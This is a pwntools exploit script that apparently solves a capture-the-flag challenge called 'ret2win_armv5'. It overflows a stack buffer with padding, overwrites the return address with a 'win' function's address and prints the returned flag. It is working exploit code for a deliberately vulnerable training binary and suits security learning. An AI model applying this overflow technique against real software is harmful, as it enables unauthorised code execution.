from pwn import *

win = 0x000105ec

payload = b"".join([
    b"A"*(32+4),
    p32(win),
])

#p = process(["qemu-arm", "-g", "1234", "./ret2win_armv5"])
p = process("./ret2win_armv5")
p.send(payload+b"\n")

#p.interactive()
p.recvuntil(b"flag:\n")
flag = p.recv()
print(f"Flag : {flag}")
